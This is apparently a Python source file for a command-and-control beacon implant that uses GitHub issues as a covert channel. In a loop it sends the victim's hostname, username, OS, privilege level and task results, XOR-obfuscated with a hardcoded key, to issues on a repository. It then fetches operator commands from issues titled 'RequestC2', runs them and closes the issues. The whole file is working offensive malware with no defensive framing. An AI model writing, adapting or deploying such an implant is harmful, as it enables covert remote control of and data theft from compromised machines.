import sys
import time
import requests
import json
import base64

import urllib3
urllib3.disable_warnings()

from Beacon import xorEncode
from Beacon import Beacon


class BeaconGithub(Beacon):

    def __init__(self, project, token):
        super().__init__()
        self.project = project
        self.token = "token " + token
        self.sleepTimeMs = 7000


    def checkIn(self):
        # try:
        sessions = []
        for it in self.taskResults:
            sessions.append(it)
        self.taskResults.clear()

        boundel = {
            "arch": self.arch, 
            "beaconHash": self.beaconHash, 
            "hostname": self.hostname , 
            "listenerHash": "", 
            "os": self.os,  
            "privilege": self.privilege, 
            "sessions": "", 
            "username": self.username, 
            "lastProofOfLife":"0"
            }
        
        boundel["sessions"]=sessions

        json_object = json.dumps(boundel, separators=(',', ':'))
        dataToSend = "["+json_object+"]"

        key="dfsdgferhzdzxczevre5595485sdg";
        datab64 = xorEncode(dataToSend, key)
        bodyToPost = base64.b64encode(datab64.encode('utf-8')).decode('utf-8')

        postData = {"title": "ResponseC2: " + self.beaconHash, "body": bodyToPost}
        postDataJson = json.dumps(postData, separators=(',', ':'))
        
        # # Send results
        headers = { "Authorization": self.token, "Content-Type": "application/json", "Cookie": "logged_in=no" }
        url = "https://api.github.com/repos/" + self.project + "/issues"
        response = requests.post(url, data=postDataJson, headers=headers, verify=False)

        # print( "status " , response.status_code )
        # print( "content " , response.content )

        # Receive cmd
        headers = { "Authorization": self.token, "Accept": "application/vnd.github+json", "Cookie": "logged_in=no" }
        url = "https://api.github.com/repos/" + self.project + "/issues"
        response = requests.get(url, headers=headers, verify=False)

        # print( "status " , response.status_code )
        # print( "content " , response.content )

        jsonNode = json.loads(response.content.decode('utf-8'))
        for it in jsonNode:
            # print(it)
            title = it["title"]
            body = it["body"]
            number = it["number"]

            # print( "title " , title )
            # print( "body " , body )
            # print( "number " , number )

            if "RequestC2: " in title and self.beaconHash in title:
        
                # cmdToTasks
                bodyb64d = base64.b64decode(body).decode('utf-8')

                bodyb64dd = xorEncode(bodyb64d, key)

                self.cmdToTasks(bodyb64dd)

                postClose = {"state": "closed"}
                postDataJson = json.dumps(postClose, separators=(',', ':'))
                headers = { "Authorization": self.token, "Content-Type": "application/json", "Cookie": "logged_in=no" }
                url = "https://api.github.com/repos/" + self.project + "/issues/" + str(number)
                response = requests.post(url, data=postDataJson, headers=headers, verify=False)

                # print( "status " , response.status_code )
                # print( "content " , response.content )

        # except:
        #   print("An exception occurred") 



    def runTasks(self):
        self.execInstruction()



def main() -> int:

    if len(sys.argv) < 2:
        print('Error: missing argument')
        sys.exit(1)

    project = sys.argv[1]
    token = sys.argv[2]

    beaconGithub = BeaconGithub(project, token)
    
    while 1:
        # try:
        beaconGithub.checkIn()

        beaconGithub.runTasks()

        # except:
        #   print("An exception occurred") 

        time.sleep(beaconGithub.sleepTimeMs/1000)

    return 0

if __name__ == '__main__':
    main() 

